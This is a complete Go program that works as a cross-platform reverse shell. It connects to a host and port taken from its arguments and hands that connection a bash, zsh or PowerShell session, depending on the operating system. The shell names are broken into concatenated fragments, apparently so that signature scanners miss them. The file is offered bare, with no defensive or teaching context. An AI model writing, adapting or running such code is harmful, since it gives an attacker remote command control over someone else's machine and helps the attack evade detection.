package main 
    import (
    "os/exec"
    "os"
    "net"
    "runtime"
    )

func main(){
	dst := os.Args[1]
	pnum := os.Args[2]
	connstring := dst + ":" + pnum
	prot := "tcp"
	netData, _ := net.Dial(prot, connstring)
	os := runtime.GOOS
	shell := exec.Command("/b" + "in" + "/b" + "ash")
	switch os {
	case "windows":
	    shell = exec.Command("pow" + "ers" + "hell" + "." +  "e" + "xe")
	case "linux": 
	    shell = exec.Command("/" + "b" + "in/" + "bas" + "h")
	case "darwin":
	    shell = exec.Command("/b" + "in" + "/z" + "s" + "h")
        }
	shell.Stdin=netData
	shell.Stdout=netData
	shell.Stderr=netData
	shell.Run()
}
